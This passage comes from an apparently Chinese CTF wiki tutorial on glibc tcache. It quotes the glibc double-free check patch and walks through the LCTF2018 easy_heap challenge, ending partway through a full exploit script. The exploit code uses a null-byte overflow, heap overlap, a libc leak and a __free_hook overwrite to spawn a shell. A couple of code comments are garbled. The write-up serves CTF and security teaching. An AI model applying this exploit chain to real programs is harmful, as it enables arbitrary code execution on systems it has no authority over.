<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x555555559af0 <span class="o">(</span>size : 0x20510<span class="o">)</span>
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span>
            unsortbin: 0x555555559250 <span class="o">(</span>size : 0x110<span class="o">)</span>
<span class="o">(</span>0x110<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">15</span><span class="o">]</span>: 0x5555555599f0 --&gt; 0x5555555598e0 --&gt; 0x5555555597d0 --&gt; 0x5555555596c0 --&gt; 0x5555555595b0 --&gt; 0x5555555594a0 --&gt; 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
</code></pre></div>
<h3 id="0x04-tcache-check">0x04 Tcache Check<a class="headerlink" href="#0x04-tcache-check" title="Permanent link">&para;</a></h3>
<p>在最新的 libc 的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7">commit</a> 中更新了 Tcache 的 double free 的check：</p>
<div class="highlight"><pre><span></span><code><span class="n">index</span> <span class="mi">6</span><span class="n">d7a6a8</span><span class="p">..</span><span class="n">f730d7a</span> <span class="mi">100644</span> <span class="p">(</span><span class="n">file</span><span class="p">)</span>
<span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
<span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
<span class="err">@@</span> <span class="mi">-2967</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">2967</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="n">mremap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">new_size</span><span class="p">)</span>
 <span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tcache_entry</span>
 <span class="p">{</span>
   <span class="k">struct</span> <span class="nc">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="o">+</span>  <span class="cm">/* This field exists to detect double frees.  */</span>
<span class="o">+</span>  <span class="k">struct</span> <span class="nc">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

 <span class="cm">/* There is one of these for each thread, which contains the</span>
<span class="cm">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span>
<span class="cm"> {</span>
<span class="cm">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span>
<span class="cm">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span>
<span class="cm">+</span>
<span class="cm">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span>
<span class="cm">+     detect a double free.  */</span>
<span class="o">+</span>  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span>
<span class="o">+</span>
   <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="err">@@</span> <span class="mi">-3005</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">3012</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
   <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="o">+</span>  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
 <span class="p">}</span>

<span class="err">@@</span> <span class="mi">-4218</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">4226</span><span class="p">,</span><span class="mi">26</span> <span class="err">@@</span> <span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
   <span class="p">{</span>
     <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>

<span class="o">+</span>    <span class="cm">/* Check to see if it&#39;s already in the tcache.  */</span>
<span class="o">+</span>    <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
<span class="o">+</span>
<span class="o">+</span>    <span class="cm">/* This test succeeds on double free.  However, we don&#39;t 100%</span>
<span class="cm">+       trust it (it also matches random payload data at a 1 in</span>
<span class="cm">+       2^&lt;size_t&gt; chance), so verify it&#39;s not an unlikely coincidence</span>
<span class="cm">+       before aborting.  */</span>
<span class="o">+</span>    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="p">))</span>
<span class="o">+</span>      <span class="p">{</span>
<span class="o">+</span>       <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
<span class="o">+</span>       <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
<span class="o">+</span>       <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
<span class="o">+</span>            <span class="n">tmp</span><span class="p">;</span>
<span class="o">+</span>            <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
<span class="o">+</span>         <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span>
<span class="o">+</span>           <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): double free detected in tcache 2&quot;</span><span class="p">);</span>
<span class="o">+</span>       <span class="cm">/* If we get here, it was a coincidence.  We&#39;ve wasted a few</span>
<span class="cm">+          cycles, but don&#39;t abort.  */</span>
<span class="o">+</span>      <span class="p">}</span>
<span class="o">+</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span>
        <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span>
        <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
</code></pre></div>
<p>目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。</p>
<h3 id="0x05-the-pwn-of-ctf">0x05 The pwn of CTF<a class="headerlink" href="#0x05-the-pwn-of-ctf" title="Permanent link">&para;</a></h3>
<h4 id="challenge-1-lctf2018-pwn-easy_heap">Challenge 1 : LCTF2018 PWN easy_heap<a class="headerlink" href="#challenge-1-lctf2018-pwn-easy_heap" title="Permanent link">&para;</a></h4>
<h5 id="_1">基本信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h5>
<p>远程环境中的 libc 是 libc-2.27.so ，所以堆块申请释放过程中需要考虑 Tcache 。</p>
<div class="highlight"><pre><span></span><code>zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/lctf2018/easy/easy_heap&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div>
<h5 id="_2">基本功能<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h5>
<ol>
<li>输入函数：循环读入一个字节，如果出现 null 字节或是换行符则停止读入，之后对当前读入的末尾位置和 size 位置进行置零操作。</li>
<li>new: 使用 <code>malloc(0xa8)</code> 分配一个块，记录下 size ，输入内容。</li>
<li>free: 首先根据记录下的 size 对堆块进行 <code>memset</code> 清零，之后进行常规 free</li>
<li>show：使用 puts 进行输出</li>
</ol>
<p>功能较为简单。</p>
<p>记录一个 chunk 结构的结构体：</p>
<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">Chunk</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>
<p>使用了一个在堆上分配的结构来记录所有 <code>Chunk</code> 结构体，一共可以分配 10 个块。</p>
<p>程序的读入输入函数存在一个 null-byte-overflow 漏洞 ，具体见如下代码</p>
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">read_input</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                                        
  <span class="k">if</span> <span class="p">(</span> <span class="n">sz</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">1uLL</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">sz</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">||</span> <span class="o">!</span><span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">||</span> <span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="o">++</span><span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">malloc_p</span><span class="p">[</span><span class="n">sz</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                           <span class="c1">// null-byte-overflow</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="n">malloc_p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h5 id="_3">利用思路<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h5>
<p>由于存在 tcache ，所以利用过程中需要考虑到 tcache 的存在。</p>
<p>通常来讲在堆程序中出现 null-byte-overflow 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。</p>
<p>null-byte-overflow 漏洞的利用方法通过溢出覆盖 prev_in_use 字节使得堆块进行合并，然后使用伪造的 prev_size 字段使得合并时造成堆块交叉。但是本题由于输入函数无法输入 NULL 字符，所以无法输入 prev_size 为 0x_00 的值，而堆块分配大小是固定的，所以直接采用 null-byte-overflow 的方法无法进行利用，需要其他方法写入 prev_size 。</p>
<p>在没有办法手动写入 prev_size ，但又必须使用 prev_size 才可以进行利用的情况下，考虑使用系统写入的 prev_size 。</p>
<p>方法为：在 unsorted bin 合并时会写入 prev_size，而该 prev_size 不会被轻易覆盖（除非有新的 prev_size 需要写入），所以可以利用该 prev_size 进行利用。</p>
<p>具体过程：</p>
<ol>
<li>将 <code>A -&gt; B -&gt; C</code> 三块 unsorted bin chunk 依次进行释放</li>
<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li>
<li>A  、 B  、 C 合并，步骤 2 中写入的 0x200 依然保持</li>
<li>利用 unsorted bin 切分，分配出 A </li>
<li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li>
<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li>
<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： <code>A (free) -&gt; B (allocated) -&gt; C (free)</code>，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
</ol>
<p>但是在这个过程中需要注意 tcache 的影响。</p>
<h5 id="_4">利用步骤<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h5>
<h6 id="unsorted-bin-chunk">重排堆块结构，释放出 unsorted bin chunk<a class="headerlink" href="#unsorted-bin-chunk" title="Permanent link">&para;</a></h6>
<p>由于本题只有 10 个可分配块数量，而整个过程中我们需要用到 3 个 unsorted bin 的 chunk ，加上 7 个 tcache 的 chunk ，所以需要进行一下重排，将一个 tcache 的 chunk 放到 3 个 unsorted bin chunk 和 top chunk 之间，否则会触发 top 的合并。</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># step 1: get three unsortedbin chunks</span>
    <span class="c1"># note that to avoid top consolidation, we need to arrange them like:</span>
    <span class="c1"># tcache * 6 -&gt; unsortd  * 3 -&gt; tcache</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - unsorted&#39;</span><span class="p">)</span> <span class="c1"># three unsorted bin chunks</span>

    <span class="c1"># arrange:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div>
<p>重分配后的堆结构：</p>
<div class="highlight"><pre><span></span><code>+-----+
|     | &lt;-- tcache perthread 结构体
+-----+
| ... | &lt;-- 6 个 tcache 块
+-----+
|  A  | &lt;-- 3 个 unsorted bin 块
+-----+
|  B  |
+-----+
|  C  |
+-----+
|     | &lt;-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
</code></pre></div>
<h6 id="null">按照解析中的步骤进行 NULL 字节溢出触发<a class="headerlink" href="#null" title="Permanent link">&para;</a></h6>
<p>为了触发 NULL 字节溢出，我们需要使得解析中的 B 块可以溢出到 C 块中。由于题目中没有 edit 功能，所以我们需要让 B 块进入 tcache 中，这样就可以在释放后再分配出来，且由于 tcache 没有太多变化和检查，会较为稳定。</p>
<div class="highlight"><pre><span></span><code>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>

    <span class="c1"># rearrange to take second unsorted bin into tcache chunk, but leave first </span>
    <span class="c1"># unsorted bin unchanged</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;7 - first&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;8 - second&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;9 - third&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="c1"># move second into tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div>
<p>之后进行 A 块的释放（用来提供有效的可以进行 unlink 的 fd 和 bk 值）</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># delete first to provide valid fd &amp; bk</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</code></pre></div>
<p>现在堆块结构如下：</p>
<div class="highlight"><pre><span></span><code>+-----+
|     | &lt;-- tcache perthread 结构体
+-----+
| ... | &lt;-- 6 个 tcache 块 (free)
+-----+
|  A  | &lt;-- free
+-----+
|  B  | &lt;-- free 且为 tcache 块
+-----+
|  C  |
+-----+
|     | &lt;-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
</code></pre></div>
<p>tcache bin 链表中，第一位的是 B 块，所以现在可以将 B 块进行分配，且进行 NULL 字符溢出。</p>
<div class="highlight"><pre><span></span><code>    <span class="n">new</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;0 - overflow&#39;</span><span class="p">)</span>
</code></pre></div>
<p>在之后的步骤中，我们需要 A 处于 unsorted bin 释放状态，B 处于分配状态，C 处于分配状态，且最后可以在 tcache 块 7 个全满的情况下进行释放（触发合并），所以我们需要 7 个 tcache 都被 free 掉。</p>
<p>此时由于 B 块被分配为 tcache 块了，所以需要将防止 top 合并的 tcache 块释放掉。</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># fill up tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</code></pre></div>
<p>之后就可以将 C 块释放，进行合并。</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># trigger</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
</code></pre></div>
<p>合并后的结构：</p>
<div class="highlight"><pre><span></span><code>+-----+
|     | &lt;-- tcache perthread 结构体
+-----+
| ... | &lt;-- 6 个 tcache 块 (free)
+-----+                     --------+
|  A  | &lt;-- free 大块               |
+-----+                             |
|  B  | &lt;-- 已分配          --------+--&gt; 一个大 free 块
+-----+                             |
|  C  | &lt;-- free                    |
+-----+                     --------+
|     | &lt;-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
</code></pre></div>
<h6 id="_5">地址泄露<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h6>
<p>此时的堆已经出现交叉了，接下来将 A 大小从 unsorted bin 中分配出来，就可以使得 libc 地址落入 B 中：</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># step 3: leak, fill up </span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;8 - fillup&#39;</span><span class="p">)</span>

    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)))</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
</code></pre></div>
<p>堆结构：</p>
<div class="highlight"><pre><span></span><code>+-----+
|     | &lt;-- tcache perthread 结构体
+-----+
| ... | &lt;-- 6 个 tcache 块 (free)
+-----+
|  A  | &lt;-- 已分配
+-----+
|  B  | &lt;-- 已分配          --------+&gt; 一个大 free 块
+-----+                             |
|  C  | &lt;-- free                    |
+-----+                     --------+
|     | &lt;-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
</code></pre></div>
<h6 id="tcache-uaf-attack">tcache UAF attack<a class="headerlink" href="#tcache-uaf-attack" title="Permanent link">&para;</a></h6>
<p>接下来，由于 B 块已经是 free 状态，但是又有指针指向，所以我们只需要再次分配，使得有两个指针指向 B 块，之后在 tcache 空间足够时，利用 tcache 进行 double free ，进而通过 UAF 攻击 free hook 即可。</p>
<div class="highlight"><pre><span></span><code>    <span class="c1"># step 4: constrecvuntilct UAF, write into __free_hook</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;9 - next&#39;</span><span class="p">)</span>
    <span class="c1"># these two provides sendlineots for tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span> <span class="c1"># 0</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">into target&#39;</span><span class="p">)</span> <span class="c1"># 1</span>
    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span> 
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

    <span class="c1"># system(&quot;/bin/sh\x00&quot;)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h5 id="exploit">完整 exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code><span class="ch">#! /usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># vim:fenc=utf-8</span>
<span class="c1">#</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">os.path</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./easy_heap&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;index </span><span class="se">\n</span><span class="s1">&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


